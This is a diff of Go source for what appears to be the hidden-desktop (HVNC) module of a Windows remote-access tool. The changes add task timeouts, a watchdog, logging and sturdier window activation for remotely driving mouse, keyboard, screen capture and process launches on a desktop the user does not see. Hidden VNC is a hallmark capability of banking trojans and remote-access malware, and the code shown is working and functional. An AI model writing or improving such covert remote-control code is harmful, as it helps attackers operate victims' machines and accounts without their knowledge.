@@ -7,6 +7,7 @@ import (
 	"image"
 	"log"
 	"runtime"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"syscall"
@@ -35,12 +36,13 @@ var (
 	procWindowFromPoint     = user32.NewProc("WindowFromPoint")
 	procScreenToClient      = user32.NewProc("ScreenToClient")
 	procPostMessageW        = user32.NewProc("PostMessageW")
-	procSendMessageW        = user32.NewProc("SendMessageW")
+	procSendMessageTimeoutW = user32.NewProc("SendMessageTimeoutW")
 	procSetWindowPos        = user32.NewProc("SetWindowPos")
 	procSetForegroundWindow = user32.NewProc("SetForegroundWindow")
 	procSetActiveWindow     = user32.NewProc("SetActiveWindow")
 	procSetFocus            = user32.NewProc("SetFocus")
 	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
+	procGetAncestor         = user32.NewProc("GetAncestor")
 	procMapVirtualKeyW      = user32.NewProc("MapVirtualKeyW")
 	procToUnicode           = user32.NewProc("ToUnicode")
 )
@@ -111,6 +113,7 @@ const (
 	MK_MBUTTON             = 0x0010
 	WHEEL_DELTA            = 120
 	HTCAPTION              = 2
+	HTCLIENT               = 1
 	HTCLOSE                = 20
 	HTMINBUTTON            = 8
 	HTMAXBUTTON            = 9
@@ -122,6 +125,8 @@ const (
 	HTBOTTOM               = 15
 	HTBOTTOMLEFT           = 16
 	HTBOTTOMRIGHT          = 17
+	GA_ROOT                = 2
+	SMTO_ABORTIFHUNG       = 0x0002
 )
 
 var (
@@ -135,6 +140,7 @@ var (
 	hvncThreadErr       error
 	hvncThreadReady     chan struct{}
 	hvncThreadTasks     chan hvncTask
+	hvncWatchdogOnce    sync.Once
 	hvncNoWindowLogNs   atomic.Int64
 	hvncInputMu         sync.Mutex
 	hvncLastCursor      point
@@ -149,6 +155,11 @@ var (
 	hvncWindowSize      point
 	hvncWindowToMove    uintptr
 	hvncMouseButtons    uint32
+	hvncPendingActivate uintptr
+	hvncTaskSeq         atomic.Uint64
+	hvncCurrentTaskID   atomic.Uint64
+	hvncCurrentTaskKind atomic.Int64
+	hvncCurrentTaskNs   atomic.Int64
 )
 
 type hvncTaskKind int
@@ -166,6 +177,7 @@ const (
 
 type hvncTask struct {
 	kind     hvncTaskKind
+	id       uint64
 	display  int
 	filePath string
 	x        int32
@@ -173,6 +185,7 @@ type hvncTask struct {
 	button   int
 	vk       uint16
 	delta    int32
+	queuedAt time.Time
 	resp     chan hvncTaskResult
 }
 
@@ -324,6 +337,7 @@ func CleanupHVNCDesktop() {
 	hvncThreadReady = nil
 	hvncThreadErr = nil
 	hvncThreadOnce = sync.Once{}
+	hvncWatchdogOnce = sync.Once{}
 }
 
 func SetHVNCCursorCapture(enabled bool) {
@@ -358,6 +372,9 @@ func ensureHVNCThread() error {
 	hvncThreadOnce.Do(func() {
 		hvncThreadReady = make(chan struct{})
 		hvncThreadTasks = make(chan hvncTask)
+		hvncWatchdogOnce.Do(func() {
+			go hvncThreadWatchdog()
+		})
 		go func(handle uintptr) {
 			defer recoverAndLog("hvnc desktop thread", nil)
 			runtime.LockOSThread()
@@ -375,32 +392,48 @@ func ensureHVNCThread() error {
 
 			close(hvncThreadReady)
 			for task := range hvncThreadTasks {
+				start := time.Now()
+				hvncCurrentTaskID.Store(task.id)
+				hvncCurrentTaskKind.Store(int64(task.kind))
+				hvncCurrentTaskNs.Store(start.UnixNano())
+
+				if shouldTraceHVNCTask(task.kind) {
+					log.Printf("hvnc task: start id=%d kind=%s queued=%s details=%s", task.id, hvncTaskKindName(task.kind), start.Sub(task.queuedAt).Round(time.Millisecond), hvncTaskDetails(task))
+				}
+
+				var result hvncTaskResult
 				switch task.kind {
 				case hvncTaskStartProcess:
-					err := startHVNCProcessOnThread(task.filePath)
-					task.resp <- hvncTaskResult{nil, err}
+					result.err = startHVNCProcessOnThread(task.filePath)
 				case hvncTaskMouseMove:
-					err := hvncMouseMoveOnThread(task.display, task.x, task.y)
-					task.resp <- hvncTaskResult{nil, err}
+					result.err = hvncMouseMoveOnThread(task.display, task.x, task.y)
 				case hvncTaskMouseDown:
-					err := hvncMouseButtonOnThread(task.button, true)
-					task.resp <- hvncTaskResult{nil, err}
+					result.err = hvncMouseButtonOnThread(task.button, true)
 				case hvncTaskMouseUp:
-					err := hvncMouseButtonOnThread(task.button, false)
-					task.resp <- hvncTaskResult{nil, err}
+					result.err = hvncMouseButtonOnThread(task.button, false)
 				case hvncTaskKeyDown:
-					err := hvncKeyOnThread(task.vk, true)
-					task.resp <- hvncTaskResult{nil, err}
+					result.err = hvncKeyOnThread(task.vk, true)
 				case hvncTaskKeyUp:
-					err := hvncKeyOnThread(task.vk, false)
-					task.resp <- hvncTaskResult{nil, err}
+					result.err = hvncKeyOnThread(task.vk, false)
 				case hvncTaskMouseWheel:
-					err := hvncMouseWheelOnThread(task.delta)
-					task.resp <- hvncTaskResult{nil, err}
+					result.err = hvncMouseWheelOnThread(task.delta)
 				default:
-					img, err := hvncCaptureDisplayOnThread(task.display)
-					task.resp <- hvncTaskResult{img, err}
+					result.img, result.err = hvncCaptureDisplayOnThread(task.display)
 				}
+
+				dur := time.Since(start)
+				if shouldTraceHVNCTask(task.kind) || dur > 400*time.Millisecond {
+					if result.err != nil {
+						log.Printf("hvnc task: done id=%d kind=%s dur=%s err=%v", task.id, hvncTaskKindName(task.kind), dur.Round(time.Millisecond), result.err)
+					} else {
+						log.Printf("hvnc task: done id=%d kind=%s dur=%s", task.id, hvncTaskKindName(task.kind), dur.Round(time.Millisecond))
+					}
+				}
+
+				hvncCurrentTaskNs.Store(0)
+				hvncCurrentTaskKind.Store(-1)
+				hvncCurrentTaskID.Store(0)
+				task.resp <- result
 			}
 		}(desktopHandle)
 	})
@@ -427,73 +460,162 @@ func StartHVNCProcess(filePath string) error {
 	if filePath == "" {
 		return fmt.Errorf("empty file path")
 	}
-	if err := ensureHVNCThread(); err != nil {
+	result, err := executeHVNCTask(hvncTask{
+		kind:     hvncTaskStartProcess,
+		filePath: strings.TrimSpace(filePath),
+	}, 10*time.Second)
+	if err != nil {
 		return err
 	}
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskStartProcess, filePath: filePath, resp: resp}
-	result := <-resp
 	return result.err
 }
 
 func HVNCInputMouseMove(display int, x, y int32) error {
-	if err := ensureHVNCThread(); err != nil {
+	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseMove, display: display, x: x, y: y}, 3*time.Second)
+	if err != nil {
 		return err
 	}
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseMove, display: display, x: x, y: y, resp: resp}
-	result := <-resp
 	return result.err
 }
 
 func HVNCInputMouseDown(button int) error {
-	if err := ensureHVNCThread(); err != nil {
+	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseDown, button: button}, 3*time.Second)
+	if err != nil {
 		return err
 	}
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseDown, button: button, resp: resp}
-	result := <-resp
 	return result.err
 }
 
 func HVNCInputMouseUp(button int) error {
-	if err := ensureHVNCThread(); err != nil {
+	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseUp, button: button}, 3*time.Second)
+	if err != nil {
 		return err
 	}
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseUp, button: button, resp: resp}
-	result := <-resp
 	return result.err
 }
 
 func HVNCInputKeyDown(vk uint16) error {
-	if err := ensureHVNCThread(); err != nil {
+	result, err := executeHVNCTask(hvncTask{kind: hvncTaskKeyDown, vk: vk}, 3*time.Second)
+	if err != nil {
 		return err
 	}
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskKeyDown, vk: vk, resp: resp}
-	result := <-resp
 	return result.err
 }
 
 func HVNCInputKeyUp(vk uint16) error {
-	if err := ensureHVNCThread(); err != nil {
+	result, err := executeHVNCTask(hvncTask{kind: hvncTaskKeyUp, vk: vk}, 3*time.Second)
+	if err != nil {
 		return err
 	}
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskKeyUp, vk: vk, resp: resp}
-	result := <-resp
 	return result.err
 }
 
 func HVNCInputMouseWheel(delta int32) error {
-	if err := ensureHVNCThread(); err != nil {
+	result, err := executeHVNCTask(hvncTask{kind: hvncTaskMouseWheel, delta: delta}, 3*time.Second)
+	if err != nil {
 		return err
 	}
-	resp := make(chan hvncTaskResult, 1)
-	hvncThreadTasks <- hvncTask{kind: hvncTaskMouseWheel, delta: delta, resp: resp}
-	result := <-resp
 	return result.err
+}
+
+func executeHVNCTask(task hvncTask, timeout time.Duration) (hvncTaskResult, error) {
+	if err := ensureHVNCThread(); err != nil {
+		return hvncTaskResult{}, err
+	}
+	if hvncThreadTasks == nil {
+		return hvncTaskResult{}, fmt.Errorf("hvnc thread not available")
+	}
+	if timeout <= 0 {
+		timeout = 3 * time.Second
+	}
+
+	task.resp = make(chan hvncTaskResult, 1)
+	task.id = hvncTaskSeq.Add(1)
+	task.queuedAt = time.Now()
+	timer := time.NewTimer(timeout)
+	defer timer.Stop()
+
+	select {
+	case hvncThreadTasks <- task:
+	case <-timer.C:
+		log.Printf("hvnc input: task enqueue timeout id=%d kind=%s timeout=%s", task.id, hvncTaskKindName(task.kind), timeout)
+		return hvncTaskResult{}, fmt.Errorf("hvnc task queue timed out")
+	}
+
+	select {
+	case result := <-task.resp:
+		return result, nil
+	case <-timer.C:
+		log.Printf("hvnc input: task execution timeout id=%d kind=%s timeout=%s", task.id, hvncTaskKindName(task.kind), timeout)
+		return hvncTaskResult{}, fmt.Errorf("hvnc task execution timed out")
+	}
+}
+
+func hvncThreadWatchdog() {
+	ticker := time.NewTicker(2 * time.Second)
+	defer ticker.Stop()
+	for range ticker.C {
+		id := hvncCurrentTaskID.Load()
+		if id == 0 {
+			continue
+		}
+		startNs := hvncCurrentTaskNs.Load()
+		if startNs == 0 {
+			continue
+		}
+		running := time.Since(time.Unix(0, startNs))
+		if running >= 2*time.Second {
+			kind := hvncTaskKindName(hvncTaskKind(hvncCurrentTaskKind.Load()))
+			log.Printf("hvnc watchdog: thread appears stuck id=%d kind=%s running=%s", id, kind, running.Round(time.Millisecond))
+		}
+	}
+}
+
+func shouldTraceHVNCTask(kind hvncTaskKind) bool {
+	switch kind {
+	case hvncTaskMouseDown, hvncTaskMouseUp, hvncTaskKeyDown, hvncTaskKeyUp, hvncTaskMouseWheel, hvncTaskStartProcess:
+		return true
+	default:
+		return false
+	}
+}
+
+func hvncTaskKindName(kind hvncTaskKind) string {
+	switch kind {
+	case hvncTaskCapture:
+		return "capture"
+	case hvncTaskStartProcess:
+		return "start_process"
+	case hvncTaskMouseMove:
+		return "mouse_move"
+	case hvncTaskMouseDown:
+		return "mouse_down"
+	case hvncTaskMouseUp:
+		return "mouse_up"
+	case hvncTaskKeyDown:
+		return "key_down"
+	case hvncTaskKeyUp:
+		return "key_up"
+	case hvncTaskMouseWheel:
+		return "mouse_wheel"
+	default:
+		return fmt.Sprintf("unknown(%d)", kind)
+	}
+}
+
+func hvncTaskDetails(task hvncTask) string {
+	switch task.kind {
+	case hvncTaskMouseDown, hvncTaskMouseUp:
+		return fmt.Sprintf("button=%d", task.button)
+	case hvncTaskKeyDown, hvncTaskKeyUp:
+		return fmt.Sprintf("vk=%d", task.vk)
+	case hvncTaskMouseWheel:
+		return fmt.Sprintf("delta=%d", task.delta)
+	case hvncTaskStartProcess:
+		return fmt.Sprintf("cmd=%q", task.filePath)
+	default:
+		return ""
+	}
 }
 
 func hvncCaptureDisplayOnThread(display int) (*image.RGBA, error) {
@@ -666,31 +788,49 @@ func hvncMouseMoveOnThread(display int, x, y int32) error {
 	moveHVNCWindowIfDragging(point{x: int32(absX), y: int32(absY)})
 
 	pt := point{x: int32(absX), y: int32(absY)}
-	hwnd := windowFromPoint(pt)
-	if hwnd != 0 {
-		setWorkingWindow(hwnd)
+	hitHwnd := windowFromPoint(pt)
+	if hitHwnd != 0 {
+		rootHwnd := rootWindow(hitHwnd)
+		if rootHwnd != 0 {
+			rememberWorkingWindow(rootHwnd)
+		} else {
+			rememberWorkingWindow(hitHwnd)
+		}
 		clientPt := pt
-		procScreenToClient.Call(hwnd, uintptr(unsafe.Pointer(&clientPt)))
-		postMouseMessage(hwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
+		procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
+		postMouseMessage(hitHwnd, WM_MOUSEMOVE, uintptr(currentMouseButtons()), clientPt)
 	}
 	return nil
 }
 
 func hvncMouseButtonOnThread(button int, down bool) error {
 	pt := currentHVNCCursor()
-	hwnd := windowFromPoint(pt)
-	if hwnd == 0 {
+	hitHwnd := windowFromPoint(pt)
+	if hitHwnd == 0 {
 		return nil
 	}
-	setWorkingWindow(hwnd)
+	rootHwnd := rootWindow(hitHwnd)
+	if rootHwnd == 0 {
+		rootHwnd = hitHwnd
+	}
+	rememberWorkingWindow(rootHwnd)
 	if button == 0 {
-		handleNonClientHit(hwnd, pt, down)
+		if down {
+			setPendingActivation(rootHwnd)
+		} else {
+			if pending := consumePendingActivation(); pending != 0 && pending != rootHwnd {
+				rootHwnd = pending
+			}
+		}
+	}
+	if button == 0 {
+		handleNonClientHit(rootHwnd, pt, down)
 	}
 	if button == 0 && !down {
 		endHVNCWindowDrag(pt)
 	}
 	clientPt := pt
-	procScreenToClient.Call(hwnd, uintptr(unsafe.Pointer(&clientPt)))
+	procScreenToClient.Call(hitHwnd, uintptr(unsafe.Pointer(&clientPt)))
 
 	var msg uint32
 	var wparam uintptr
@@ -723,21 +863,28 @@ func hvncMouseButtonOnThread(button int, down bool) error {
 		return nil
 	}
 
-	postMouseMessage(hwnd, msg, wparam, clientPt)
+	postMouseMessage(hitHwnd, msg, wparam, clientPt)
+
+	// Activate on left-button release after posting click so transient popups remain interactable while hovering.
+	if button == 0 && !down && rootHwnd != 0 {
+		setWorkingWindow(rootHwnd)
+	}
 	return nil
 }
 
 func hvncKeyOnThread(vk uint16, down bool) error {
-	hwnd := getWorkingWindow()
+	pt := currentHVNCCursor()
+	hwnd := windowFromPoint(pt)
 	if hwnd == 0 {
-		pt := currentHVNCCursor()
-		hwnd = windowFromPoint(pt)
-		if hwnd == 0 {
-			return nil
-		}
-		setWorkingWindow(hwnd)
+		hwnd = foregroundWindow()
 	}
-	setWorkingWindow(hwnd)
+	if hwnd == 0 {
+		hwnd = getWorkingWindow()
+	}
+	if hwnd == 0 {
+		return nil
+	}
+	rememberWorkingWindow(rootWindow(hwnd))
 	updateModifierState(vk, down)
 
 	if isModifierVK(vk) {
@@ -758,6 +905,11 @@ func hvncKeyOnThread(vk uint16, down bool) error {
 	return nil
 }
 
+func foregroundWindow() uintptr {
+	r, _, _ := procGetForegroundWindow.Call()
+	return r
+}
+
 func makeLParam(x, y int32) uintptr {
 	return uintptr((uint32(y) << 16) | (uint32(x) & 0xFFFF))
 }
@@ -767,16 +919,34 @@ func windowFromPoint(pt point) uintptr {
 	return ret
 }
 
+func rootWindow(hwnd uintptr) uintptr {
+	if hwnd == 0 {
+		return 0
+	}
+	r, _, _ := procGetAncestor.Call(hwnd, GA_ROOT)
+	if r == 0 {
+		return hwnd
+	}
+	return r
+}
+
 func setWorkingWindow(hwnd uintptr) {
+	if hwnd == 0 {
+		return
+	}
+	rememberWorkingWindow(hwnd)
+	procSetForegroundWindow.Call(hwnd)
+	procSetActiveWindow.Call(hwnd)
+	procSetFocus.Call(hwnd)
+}
+
+func rememberWorkingWindow(hwnd uintptr) {
 	if hwnd == 0 {
 		return
 	}
 	hvncInputMu.Lock()
 	hvncWorkingWindow = hwnd
 	hvncInputMu.Unlock()
-	procSetForegroundWindow.Call(hwnd)
-	procSetActiveWindow.Call(hwnd)
-	procSetFocus.Call(hwnd)
 }
 
 func getWorkingWindow() uintptr {
@@ -800,6 +970,20 @@ func currentHVNCCursor() point {
 
 func postMouseMessage(hwnd uintptr, msg uint32, wparam uintptr, pt point) {
 	procPostMessageW.Call(hwnd, uintptr(msg), wparam, makeLParam(pt.x, pt.y))
+}
+
+func setPendingActivation(hwnd uintptr) {
+	hvncInputMu.Lock()
+	hvncPendingActivate = hwnd
+	hvncInputMu.Unlock()
+}
+
+func consumePendingActivation() uintptr {
+	hvncInputMu.Lock()
+	defer hvncInputMu.Unlock()
+	hwnd := hvncPendingActivate
+	hvncPendingActivate = 0
+	return hwnd
 }
 
 func postKeyMessage(hwnd uintptr, msg uint32, vk uint16) {
@@ -867,8 +1051,10 @@ func virtualKeyToChars(vk uint16) []rune {
 
 func handleNonClientHit(hwnd uintptr, screenPt point, down bool) {
 	lparam := makeLParam(screenPt.x, screenPt.y)
-	hit, _, _ := procSendMessageW.Call(hwnd, WM_NCHITTEST, 0, lparam)
-	hitTest := int32(hit)
+	hitTest := safeNCHitTest(hwnd, lparam)
+	if hitTest == HTCLIENT || hitTest == 0 {
+		return
+	}
 
 	if hitTest == HTCLOSE && !down {
 		procPostMessageW.Call(hwnd, WM_CLOSE, 0, 0)
@@ -899,6 +1085,24 @@ func handleNonClientHit(hwnd uintptr, screenPt point, down bool) {
 		}
 		procPostMessageW.Call(hwnd, uintptr(msg), uintptr(hitTest), lparam)
 	}
+}
+
+func safeNCHitTest(hwnd uintptr, lparam uintptr) int32 {
+	const timeoutMs = 75
+	var result uintptr
+	r, _, _ := procSendMessageTimeoutW.Call(
+		hwnd,
+		WM_NCHITTEST,
+		0,
+		lparam,
+		SMTO_ABORTIFHUNG,
+		timeoutMs,
+		uintptr(unsafe.Pointer(&result)),
+	)
+	if r == 0 {
+		return 0
+	}
+	return int32(result)
 }
 
 func moveHVNCWindowIfDragging(screenPt point) {
